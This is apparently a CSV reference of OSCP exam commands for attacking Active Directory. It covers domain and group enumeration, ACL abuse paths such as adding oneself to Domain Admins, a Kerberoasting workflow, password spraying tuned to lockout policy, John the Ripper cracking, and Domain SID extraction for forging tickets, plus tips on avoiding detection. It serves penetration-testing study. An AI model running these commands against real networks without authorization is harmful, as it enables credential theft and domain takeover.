"id","name","category","command","description","subcategory","notes","oscp_relevance"
"net-group-domain-list","List All Domain Groups","enumeration","net group /domain","Enumerate all security groups in the domain","","OSCP METHODOLOGY:
Enumerate all domain groups to identify high-privilege targets.

DEFAULT HIGH-VALUE GROUPS:
- Domain Admins:
Full domain control
- Enterprise Admins:
Forest-wide control
- Administrators:
Local admin on domain computers
- Backup Operators:
SeBackupPrivilege
- Account Operators:
Can create/modify accounts
- Server Operators:
Service management

CUSTOM GROUPS TO TARGET:
Look for naming patterns:
- *Admin*, *IT*, *Service*:
Often have elevated permissions
- *Management*, *Executive*:
May have sensitive data access
- *Development*, *DevOps*:
May have deployment privileges

COMMAND:
  net group /domain

NEXT STEPS:
For each interesting group:
  net group ""<GROUPNAME>"" /domain

Time:
<5 seconds","high"
"net-group-domain-members","List Members of Specific Domain Group","enumeration","net group ""<GROUPNAME>"" /domain","Enumerate all members of a specific domain group to identify high-value targets","","CRITICAL LIMITATION:
net.exe only lists user objects, NOT nested group objects.

NESTED GROUP DETECTION:
If you see a member name but:
  net user <USERNAME> /domain
fails with ""user not found"" → It's a nested group, not a user.

WORKAROUND FOR NESTED GROUPS:
- PowerView:
Get-NetGroupMember -Recurse
- Manual LDAP query from Kali
- Enumerate the nested group:
net group ""<NESTED_GROUP>"" /domain

COMMAND:
  net group ""Domain Admins"" /domain

OSCP PRIORITY:
Domain Admins members = instant win if compromised.
Enumerate each member with net user to find attack vectors.

Time:
<5 seconds per group","high"
"net-accounts-domain","Get Domain Password Policy","enumeration","net accounts /domain","Retrieve domain password policy including minimum length, complexity, lockout threshold, and password age requirements","","CRITICAL FOR PASSWORD ATTACKS:
Understand domain password policy before attempting password spraying or brute force.

KEY FIELDS:
1.

Lockout threshold:
   How many failed attempts before account lockout.
   - 0 = Unlimited attempts (brute force freely)
   - 5 = Limit to 2-3 attempts per account
   - Common values:
3, 5, 10, or 0

2.

Lockout duration:
   How long account stays locked after threshold reached.
   - 30 minutes = Wait or move to different accounts
   - Forever (until admin unlock) = Very dangerous

3.

Minimum password length:
   Shortest password allowed (typically 8-14 characters).

4.

Password complexity:
   Requirements:
uppercase, lowercase, numbers, symbols.

COMMAND:
  net accounts /domain

OSCP STRATEGY:
- Lockout threshold 0:
Spray unlimited passwords per user
- Lockout threshold 3-5:
Maximum 2 passwords per user
- Lockout threshold 10+:
Can try 5-7 passwords safely

Time:
<5 seconds","high"
"setspn-list-user","List SPNs for Specific User","enumeration","setspn -L <USERNAME>","List Service Principal Names (SPNs) associated with a specific user account to identify service accounts and potential Kerberoasting targets","","WHY SERVICE ACCOUNTS MATTER:
- Elevated privileges (local admin, database access)
- Weak passwords (rarely changed)
- Kerberoastable (offline cracking, no lockout)

SPN FORMAT:
ServiceClass/Host:Port/ServiceName

COMMON SERVICE CLASSES:
- HTTP:
Web servers (IIS, Apache)
- MSSQLSvc:
SQL Server
- TERMSRV:
RDP/Terminal Services
- HOST:
Multiple services

COMMAND:
  setspn -L svc_sql

KERBEROASTING WORKFLOW:
1.

Find user with SPN:
setspn -L <USERNAME>

2.

Request service ticket:
Rubeus.exe kerberoast /user:<USERNAME>

3.

Crack offline:
hashcat -m 13100 ticket.txt wordlist.txt

OSCP ADVANTAGE:
Offline attack - no account lockout risk.

Time:
<5 seconds per user","high"
"setspn-query-all","Query All SPNs in Domain","enumeration","setspn -Q */*","Enumerate all Service Principal Names registered in the domain to discover service accounts and services","","WHAT THIS REVEALS:
All registered services with hostnames/ports WITHOUT port scanning.

EXAMPLE OUTPUT:
  MSSQLSvc/DB01.corp.com:1433
  → SQL Server on DB01, port 1433

  HTTP/WEB01.corp.com
  → IIS web server on WEB01

COMMAND:
  setspn -Q */*

HIGH-VALUE SPNS:
- MSSQLSvc:
SQL Server (often elevated privileges)
- HTTP/HTTPS:
IIS web servers
- exchangeMDB:
Exchange servers
- TERMSRV:
RDP services

OSCP WORKFLOW:
1.

Query all SPNs:
setspn -Q */*

2.

Extract usernames from CN= lines

3.

Check each user:
setspn -L <USERNAME>

4.

Kerberoast high-value accounts

Time:
10-30 seconds (depends on domain size)","high"
"dsquery-user","Query Domain Users with dsquery","enumeration","dsquery user","Query Active Directory for user objects using dsquery (built-in AD query tool)","","dsquery is part of Windows Server RSAT and may not be available on all Windows clients.

Returns Distinguished Names (LDAP format) instead of usernames, requiring additional parsing.

For OSCP, net.exe is more reliable as it's installed by default on all Windows versions.

dsquery is useful when you need LDAP-formatted queries or when net.exe is restricted by policy.","medium"
"dsquery-computer","Query Domain Computers with dsquery","enumeration","dsquery computer","Query Active Directory for computer objects to enumerate domain-joined machines","","Reveals all domain-joined computers without network scanning.

Domain Controllers are in 'OU=Domain Controllers', servers/workstations in 'CN=Computers' or custom OUs.

Extract hostname from CN= field.

OSCP:
Less useful than net.exe or PowerView since output requires parsing.

Use when net.exe is restricted or you need to query specific OUs with -startnode flag.","medium"
"dsquery-group","Query Domain Groups with dsquery","enumeration","dsquery group","Query Active Directory for group objects to enumerate security groups","","Returns LDAP distinguished names which require parsing.

net.exe provides cleaner output.

Use dsquery when you need to query specific OUs or when net.exe is restricted.

OSCP:
Stick with net group /domain for exam - faster and cleaner output.","medium"
"net-group-domain-admins","List Domain Admins Group Members","enumeration","net group ""Domain Admins"" /domain","Enumerate members of Domain Admins group using built-in net.exe","","SHORTCUT COMMAND:
Direct query for Domain Admins group members.

WHY THIS MATTERS:
- Domain Admins = Full domain control
- Identify highest-value compromise targets
- Check for service accounts in this group (Kerberoasting gold)

COMMAND:
  net group ""Domain Admins"" /domain

NEXT STEPS:
Enumerate each member:
  net user <MEMBER> /domain

Time:
<5 seconds","high"
"net-group-domain-computers","List Domain Computers Group","enumeration","net group ""Domain Computers"" /domain","Enumerate computer accounts in the domain","","Shows all computer accounts in the domain.

Computer names end with $.","medium"
"net-domain-controllers","Identify Domain Controllers","enumeration","nltest /dclist:<DOMAIN>","List all domain controllers in the domain using nltest","","IDENTIFY DOMAIN CONTROLLERS:
List all DCs in the domain.

WHY TARGET DCs:
- Hold master copy of AD database (NTDS.dit)
- Contain all domain credentials
- DCSync attacks possible if compromised

COMMAND:
  nltest /dclist:corp.com

OUTPUT:
  PDC = Primary Domain Controller
  Lists all DC hostnames and IPs

Time:
<5 seconds","high"
"setspn-list-all","List All SPNs in Domain","enumeration","setspn -T <DOMAIN> -Q */*","Enumerate all Service Principal Names (SPNs) in the domain for Kerberoasting","","ENUMERATE ALL SPNS IN DOMAIN:
Discover Kerberoasting targets domain-wide.

COMMAND:
  setspn -T corp.com -Q */*

WHAT TO LOOK FOR:
- USER accounts with SPNs (Kerberoastable)
- Ignore COMPUTER$ accounts (not crackable)

FOCUS ON:
- MSSQLSvc:
SQL service accounts
- HTTP:
Web service accounts
- Custom services:
Application accounts

KERBEROASTING:
User accounts with SPNs = offline crackable tickets.

Time:
10-30 seconds","high"
"dsquery-users","Query All Domain Users (dsquery)","enumeration","dsquery user","LDAP query for all user objects in the domain using dsquery","","Returns distinguished names (DNs), not usernames.

Pipe to dsget for readable output:
dsquery user | dsget user -samid -desc","medium"
"dsquery-computers","Query All Domain Computers (dsquery)","enumeration","dsquery computer","LDAP query for all computer objects in the domain","","Returns DNs.

Convert to hostnames:
dsquery computer | dsget computer -name","medium"
"dsquery-admins","Query Domain Admins Group (dsquery)","enumeration","dsquery group -name ""Domain Admins"" | dsget group -members","Query Domain Admins group and list all members","","TWO-STAGE QUERY:
1.

dsquery finds group DN

2.

dsget extracts members

COMMAND:
  dsquery group -name ""Domain Admins"" | dsget group -members

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  net group ""Domain Admins"" /domain
(Simpler, more reliable)

Time:
5-10 seconds","high"
"dsquery-domain-controllers","Query Domain Controllers (dsquery)","enumeration","dsquery server","Query all domain controllers in the forest","","QUERY ALL DOMAIN CONTROLLERS:
COMMAND:
  dsquery server

OUTPUT:
DC distinguished names with site information.

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  nltest /dclist:<DOMAIN>
(More reliable, built-in)

Time:
<5 seconds","high"
"powerview-get-objectacl","Get Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity <OBJECT>","Retrieve Access Control List (permissions) for any AD object to identify who has what access","","Returns ACL (Access Control List) - all permissions applied to an object.

EACH ACE (ACCESS CONTROL ENTRY) DEFINES:
1.

SecurityIdentifier:
Who has access (as SID)
2.

ActiveDirectoryRights:
What access they have (GenericAll, WriteDACL, etc.)

OUTPUT ANALYSIS:
Output is verbose - use Convert-SidToName to resolve SIDs.
Filter for dangerous rights.

OSCP PRIVESC:
Look for GenericAll, WriteDACL, WriteOwner on privileged groups/users.","high"
"powerview-get-objectacl-genericall","Find GenericAll Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has GenericAll (full control) permissions on a specific AD object","","GENERICALL = FULL CONTROL

ON USER OBJECTS:
- Reset their password
- Modify attributes
- Read all properties

ON GROUP OBJECTS:
- Add/remove members (add yourself to Domain Admins!)
- Modify group attributes

ON COMPUTER OBJECTS:
- Modify servicePrincipalName (Kerberoasting)
- Access LAPS password

OSCP:
Most powerful ACL for privilege escalation.
If you have GenericAll on privileged group → add yourself to group.","high"
"powerview-convert-sidtoname","Convert SID to Username (PowerView)","enumeration","Convert-SidToName <SID>","Resolve Security Identifier (SID) to human-readable username, group name, or computer name","","SIDs (SECURITY IDENTIFIERS):
Unique identifiers for AD objects.

FORMAT:
S-1-5-21-<domain>-<RID>

COMMON RIDS:
- 500:
Administrator
- 512:
Domain Admins
- 513:
Domain Users

Get-ObjectAcl returns SIDs in SecurityIdentifier field.
Must convert to names for analysis.

BATCH CONVERSION:
  Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName

ALTERNATIVE:
  [system.security.principal.securityidentifier]::new('<sid>').translate([system.security.principal.ntaccount]).value

OSCP:
SIDs are useless until converted to names.","high"
"powerview-get-objectacl-writedacl","Find WriteDACL Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteDacl""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can modify ACLs (permissions) on an AD object - allows granting yourself GenericAll","","WRITEDACL = MODIFY ACL PERMISSIONS

ATTACK PATH:
1.

You have WriteDACL on target object
2.

Grant yourself GenericAll on that object
3.

Now you have full control

EXAMPLE:
WriteDACL on 'Domain Admins' → Grant GenericAll → Add yourself to Domain Admins

SIMILAR POWERFUL RIGHTS:
- WriteOwner:
Change owner, then modify ACL
- WriteProperty:
Modify attributes

OSCP:
WriteDACL is as powerful as GenericAll - just requires one extra step.","high"
"powerview-get-objectacl-forcechangepassword","Find ForceChangePassword Rights (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" -ResolveGUIDs | ? {$_.ObjectAceType -eq ""User-Force-Change-Password""} | select SecurityIdentifier,ObjectAceType","Enumerate who can reset passwords for a specific user without knowing the current password","","USER-FORCE-CHANGE-PASSWORD:
Can reset user's password without knowing current password.

ATTACK PATH:
1.

You have ForceChangePassword on target user
2.

Reset their password
3.

Authenticate as them

NO CURRENT PASSWORD NEEDED.
NO ACCOUNT LOCKOUT.

SIMILAR RIGHTS:
AllExtendedRights (includes password reset + other extended rights)

PROTECTED ACCOUNTS:
admincount=1 may have this right restricted by AdminSDHolder.

OSCP:
If you can reset Domain Admin password → domain compromised.","high"
"powerview-get-objectacl-writeowner","Find WriteOwner Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteOwner""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can change ownership of an AD object - allows granting yourself full permissions","","WRITEOWNER = CHANGE OBJECT OWNER
Object owners have implicit rights to modify the object's ACL.

ATTACK PATH:
1.

You have WriteOwner on target object
2.

Change owner to yourself:
Set-DomainObjectOwner
3.

As owner, grant yourself GenericAll
4.

Abuse full control (add to group, reset password, etc.)

COMPARISON:
Similar to WriteDACL but requires two steps instead of one.

OSCP:
WriteOwner on privileged group = privilege escalation path.","high"
"powerview-find-interestingdomainacl","Find Interesting ACL Misconfigurations (PowerView)","enumeration","Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match ""<USERNAME>""}","Automatically discover ACL misconfigurations where specified user has dangerous permissions on other objects","","AUTOMATED ACL ENUMERATION:
Scans entire domain for dangerous permissions.

RETURNS INTERESTING RIGHTS:
- GenericAll
- WriteDACL
- WriteOwner
- ForceChangePassword

KEY FIELDS:
- IdentityReferenceName:
Who has the permission (filter for your user)
- ObjectDN:
What object they have permission on (look for privileged groups/users)

PERFORMANCE:
Slow in large domains - consider manual enumeration of specific high-value targets.

OSCP:
Run this early to identify all potential privilege escalation paths via ACL abuse.","high"
"powerview-get-pathacl","Get Share Path ACL (PowerView)","enumeration","Get-PathAcl -Path ""\\<TARGET>\<SHARE>""","Enumerate file share permissions to identify accessible or misconfigured shares","","NTFS PERMISSIONS ON NETWORK SHARES

FILESYSTEMRIGHTS:
- FullControl:
read/write/delete
- Modify:
read/write
- ReadAndExecute:
read/execute

IDENTITYREFERENCE:
Shows who has access (users/groups).

COMMON MISCONFIGURATION:
Everyone or Authenticated Users with Modify/FullControl on sensitive shares.

SYSVOL SHARE:
Domain-wide readable.
May contain GPP passwords (cpassword attribute).

OSCP:
Check all discovered shares for misconfigurations and sensitive data.","medium"
"powerview-get-objectacl-user","Get User Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific user account","","IDENTIFIES WHO CAN MODIFY USER ACCOUNT

LOOK FOR:
- GenericAll:
Full control
- WriteDACL:
Can change permissions
- ForceChangePassword:
Can reset password","high"
"powerview-get-objectacl-group","Get Group Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<GROUPNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific group (e.g., Domain Admins)","","CRITICAL FOR PRIVILEGE ESCALATION

GenericAll on Domain Admins = you can add yourself to the group.

COMMON MISCONFIGURATION:
Check this early in enumeration.","high"
"powerview-get-netcomputer-os","Enumerate Computer Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion","Query Active Directory for all domain computers with OS version information to identify legacy systems vulnerable to session enumeration attacks","","CRITICAL FOR SESSION ENUMERATION STRATEGY:
Identify systems vulnerable to NetSessionEnum attacks.

BUILD NUMBER HISTORY:
Windows 10:
- 1507 (10240):
Vulnerable
- 1511 (10586):
Vulnerable
- 1607 (14393):
Vulnerable
- 1703 (15063):
Vulnerable
- 1709 (16299):
RESTRICTED - only admins can query sessions

Windows Server:
- 2012 R2 (9600):
Vulnerable
- 2016 (14393):
Vulnerable
- 2019 (17763/1809):
RESTRICTED

TARGET BUILD NUMBERS:
- Workstations:
<16299 (pre-1709)
- Servers:
<17763 (pre-2019)

COMMAND:
  Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion

WHY THIS MATTERS:
Older systems = ANY domain user can enumerate sessions.
Modern systems = Only admins can enumerate.

OSCP STRATEGY:
Enumerate OS versions FIRST → save vulnerable targets → run Get-NetSession only on those.

Time:
10-30 seconds","high"
"powerview-get-netcomputer-os-filter","Filter Legacy Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\.')[2] -lt 16299))}","Filter domain computers to show only legacy systems vulnerable to unauthenticated NetSessionEnum (pre-Windows 10 1709, pre-Server 2019)","","PRE-FILTERED TARGET LIST:
Automatic filtering for vulnerable systems only.

COMMAND:
  Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\\.')[2] -lt 16299))}

WHAT THIS FILTERS:
- Server 2012 / 2012 R2 (build 9600)
- Server 2016 (build 14393)
- Windows 10 pre-1709 (build <16299)

RESTRICTION SOURCE:
MS security update KB4103727 (May 2018) changed SrvsvcSessionInfo registry permissions.

OSCP TIME SAVINGS:
- Without filter:
30+ minutes (enumerate all systems)
- With filter:
2-3 minutes (vulnerable systems only)

WORKFLOW:
1.

Run filter → save targets

2.

Enumerate sessions ONLY on those systems

3.

Skip modern systems entirely

Time:
10-30 seconds for filtering","high"
"check-netsessionenum-registry","Check NetSessionEnum Registry Permissions","enumeration","Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity' | Format-List","Inspect registry permissions on SrvsvcSessionInfo key to determine if NetSessionEnum API is restricted to administrators only (modern Windows) or allows authenticated users (legacy)","","Manual verification of NetSessionEnum vulnerability.

The SrvsvcSessionInfo registry value (REG_BINARY) under DefaultSecurity key is a Security Descriptor (SDDL format) that defines who can call NetWkstaUserEnum and NetSessionEnum APIs.

Pre-Windows 10 1709 / Server 2019:
Authenticated Users (S-1-5-11) have READ access to this SD = any domain user can enumerate sessions.

Post-1709/2019:
Only Administrators (S-1-5-32-544) and SYSTEM (S-1-5-18) have access = session enumeration restricted.

This is the root cause of Get-NetSession failures.

OSCP:
You likely won't check this manually (requires local admin) - instead, use OS version enumeration to predict vulnerability.

This command is for understanding WHY the restriction exists, not for routine recon.","medium"
"check-remote-registry-service","Check Remote Registry Service Status","enumeration","Get-Service -ComputerName <TARGET> -Name RemoteRegistry","Query Remote Registry service status on target system - required for PsLoggedOn and Get-NetLoggedon to enumerate logged-on users","","REMOTE REGISTRY SERVICE:
Required for PsLoggedOn and Get-NetLoggedon to work.

HOW IT WORKS:
Allows remote access to registry hives (HKLM, HKCU, HKEY_USERS) via RPC.
Tools read HKEY_USERS:
each loaded SID = logged-on user.

SERVICE STARTUP TYPES:
- Disabled:
Must be changed to Manual/Automatic first
- Manual:
Default on servers (auto-starts on connection)
- Automatic:
Always running

DEFAULT CONFIGURATIONS:
- Windows 8+ workstations:
Disabled
- Server 2012+:
Manual (good for attackers)

KEY INSIGHT:
If you have local admin + service is Manual → it auto-starts on connection (no explicit start needed).

COMMAND:
  Get-Service -ComputerName <TARGET> -Name RemoteRegistry

OSCP STRATEGY:
Check service status BEFORE attempting enumeration.
Saves time vs blind attempts.

Time:
<5 seconds per target","high"
"enable-remote-registry","Enable Remote Registry Service","enumeration","sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry","Remotely enable and start Remote Registry service to allow session enumeration via PsLoggedOn or Get-NetLoggedon (requires local admin access)","","ENABLE REMOTE REGISTRY REMOTELY:
Requires local admin access on target.

COMMAND:
  sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry

WHAT THIS DOES:
1.

Change startup type to Automatic (persistent)

2.

Start service immediately

WHY THIS WORKS:
Local admin → modify services via SCM → enable Remote Registry → use for enumeration.

SERVICE STATES:
- Disabled:
Must change to Manual/Auto first (this command)
- Manual:
Just start it (no config change needed)
- Automatic:
Already running (no action needed)

OPSEC NOTE:
Enabling services logged (Event ID 7040).
Prefer targets where service already Manual.

OSCP USE CASE:
You have admin but Remote Registry disabled → enable it → run PsLoggedOn/Get-NetLoggedon.

Time:
<10 seconds","high"
"query-hkey-users-remote","Query Remote HKEY_USERS Hive","enumeration","reg query \\<TARGET>\HKU","Manually enumerate logged-on users by querying HKEY_USERS hive on remote system via Remote Registry (each SID = logged-on user)","","MANUAL SESSION ENUMERATION:
Alternative to PsLoggedOn/Get-NetLoggedon.

HOW IT WORKS:
When users log in (interactive, RDP, RunAs), their NTUSER.DAT registry hive loads into HKEY_USERS\<SID>.
Each SID = active session.

COMMAND:
  reg query \\<TARGET>\HKU

SYSTEM SIDS TO IGNORE:
- S-1-5-18:
SYSTEM (always present)
- S-1-5-19:
LOCAL SERVICE
- S-1-5-20:
NETWORK SERVICE
- S-1-5-21-...-500:
Built-in Administrator (may not be logged in)

DOMAIN USER SIDS:
Start with S-1-5-21- and end with RID >1000.

SID-TO-NAME CONVERSION:
WMIC:
  wmic useraccount where sid='<SID>' get name

PowerShell:
  (New-Object System.Security.Principal.SecurityIdentifier('<SID>')).Translate([System.Security.Principal.NTAccount]).Value

OSCP ADVANTAGE:
Manual reg.exe often bypasses detection when automated tools blocked.

Time:
<10 seconds per target","medium"
"john-single-crack","John Single Crack Mode","enumeration","john --single <HASH_FILE>","Single crack mode using username-based variations","","OSCP TIP:
Always run single mode FIRST - it's fast (<1 minute) and surprisingly effective.

Common successes:
username123, Username1!, Username@2023.

Requires username:hash format.

Most effective on /etc/shadow dumps where GECOS fields provide hints (full names, departments).","medium"
"john-wordlist-attack","John Wordlist Attack","enumeration","john --wordlist=<WORDLIST> <HASH_FILE>","Dictionary attack using wordlist","","Standard dictionary attack.

Run after --single mode.

Use rockyou.txt for comprehensive coverage (14M passwords).

JtR auto-detects hash format in most cases.","high"
"john-rules-attack","John Rule-Based Attack","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <HASH_FILE>","Apply mutation rules to wordlist","","OSCP TIP:
Rule-based attacks crack passwords not in wordlist.

Users modify base words to meet policies (Password → Password123!).

Custom rules in /etc/john/john.conf:
[List.Rules:sshRules] then rule functions.

Default rules often sufficient - try before custom.","high"
"john-format-specify","John Specify Hash Format","enumeration","john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>","Explicitly specify hash format (when auto-detect fails)","","List all formats:
john --list=formats | grep -i <hash_type>.

Common formats:
raw-md5 (plain MD5), nt (NTLM), Raw-SHA256, bcrypt, md5crypt ($1$), sha512crypt ($6$).

Auto-detect usually works but explicit format avoids ambiguity.","medium"
"john-show-cracked","Show Cracked Passwords","enumeration","john --show <HASH_FILE>","Display previously cracked passwords from john.pot","","OSCP REQUIREMENT:
Document all cracked passwords.

Always run --show after successful crack.

JtR saves to ~/.john/john.pot permanently.

Combine with --format if needed:
john --show --format=raw-md5 hashes.txt","high"
"john-ssh-key-crack","Crack SSH Private Key Passphrase","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <SSH_HASH>","Crack SSH private key passphrase (supports all ciphers)","","OSCP TIP:
JtR supports MORE SSH ciphers than Hashcat.

Use JtR for SSH keys (especially modern keys with aes-256-ctr).

Extract hash:
ssh2john id_rsa > ssh.hash.

Build custom wordlist from user information (notes.txt, common words, dates).

Apply rules based on password policy.","high"
"john-keepass-crack","Crack KeePass Database","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <KEEPASS_HASH>","Crack KeePass master password","","Extract hash:
keepass2john Database.kdbx > keepass.hash.

Remove 'Database:' prefix.

KeePass uses slow KDF - focused wordlists essential.

User password patterns critical (reuse with policy modifications).","high"
"john-incremental-mode","John Incremental Mode (Brute-Force)","enumeration","john --incremental <HASH_FILE>","Brute-force attack with intelligent character frequency","","Last resort attack - extremely slow.

Use only when:
1) No wordlist success 2) Short password suspected 3) Fast hash (MD5, NTLM).

NOT viable for OSCP exam time constraints unless very short password (<6 chars).","low"
"john-status","John Show Status","enumeration","john --status","Display status of running/paused cracking session","","Monitor long attacks:
john --status.

During active session, press any key for instant status update (no need for separate command).

Critical for OSCP time management - check ETA regularly.","medium"
"john-restore-session","John Restore Session","enumeration","john --restore","Resume previously interrupted cracking session","","JtR auto-saves to ~/.john/john.rec.

Resume with:
john --restore.

Useful for multi-hour attacks interrupted by network issues or intentional pause.

Session file cleared after successful completion.","medium"
"john-list-formats","List All Supported Formats","enumeration","john --list=formats | grep -i <SEARCH>","List all hash formats supported by John","","Reference command - find correct format name.

Examples:
raw-md5, raw-sha256, nt (NTLM), bcrypt, SSH, KeePass.

Grep for hash type:
john --list=formats | grep -i keepass","medium"
"john-add-custom-rules","Add Custom Rules to john.conf","enumeration","sudo sh -c 'cat <RULE_FILE> >> /etc/john/john.conf'","Append custom rules to John configuration","","OSCP TIP:
Create custom rules based on password policy.

Example:
Policy requires capital + 3 digits + special → Rules:
c $1 $3 $7 $!, c $1 $2 $3 $!.

Format:
[List.Rules:sshRules] then c $1 $3 $7 $!.

Test first:
echo 'password' > test.txt && john --wordlist=test.txt --rules=sshRules --stdout (verify mutations).","high"
"ad-sid-whoami-extract","Extract Domain SID Using whoami","enumeration","whoami /user","Extract the current user's SID, from which the Domain SID can be derived by removing the RID (last portion after final hyphen).","domain-reconnaissance","OSCP METHODOLOGY:
This is the FASTEST and STEALTHIEST method to obtain the Domain SID during an exam.

Unlike PowerView or other PowerShell tools, whoami is a native Windows binary that exists on every system since Windows XP and generates minimal security event logs.

It requires NO special permissions, NO PowerShell execution policy bypasses, and NO external tool downloads.

MANUAL ALTERNATIVE:
If whoami is restricted (rare), use 'wmic useraccount get name,sid' to list all local and domain accounts with their SIDs.

Domain accounts will share the same Domain SID prefix.

WHY THIS MATTERS FOR SILVER/GOLDEN TICKETS:
The Domain SID is a REQUIRED parameter when forging Kerberos tickets with Mimikatz or Rubeus.

Mimikatz's kerberos::golden module needs '/sid:S-1-5-21-DOMAIN-DOMAIN-DOMAIN' (WITHOUT the RID).

If you include the RID by mistake, the forged ticket will be invalid and authentication will fail with 'KRB_AP_ERR_MODIFIED'.

SID STRUCTURE EXPLAINED:
- S-1:
SID revision (always 1)

- 5:
SECURITY_NT_AUTHORITY (Windows security subsystem)

- 21:
Domain or local computer account (vs.

18=SYSTEM, 32=Built-in)

- Three 10-digit segments:
Domain identifier (unique per AD domain)

- Final segment (RID):
User/group/computer relative ID within domain

COMMON OSCP EXAM SCENARIO:
You've compromised a domain user account (e.g., via password spraying or AS-REP roasting).

You need to create a Silver ticket to access an HTTP SPN on a web server.

First step:
Extract Domain SID with whoami /user.

Copy everything EXCEPT the last segment after the final hyphen.

This becomes your '/sid:' parameter.

Time:
<10 seconds total (5 sec to run command, 5 sec to extract Domain SID by removing RID)

DETECTION EVASION:
whoami /user generates Event ID 4688 (Process Creation) but this is extremely common and typically not monitored.

Unlike PowerShell cmdlets that may trigger AMSI or script block logging, whoami is a compiled binary that bypasses these defenses.

OSCP EXAM TIP:
Write the Domain SID down immediately after extraction and store it in your enumeration notes.

You'll need it multiple times if you perform Silver tickets, Golden tickets, or SID history attacks.

Don't waste time re-extracting it.

CROSS-REFERENCE WITH OTHER ENUMERATION:
If you've run PowerView's Get-NetDomain, verify the Domain SID matches.

If they differ, you may be on a child domain or in a forest trust situation.

Always use the Domain SID of the target domain where you're forging tickets.","high"
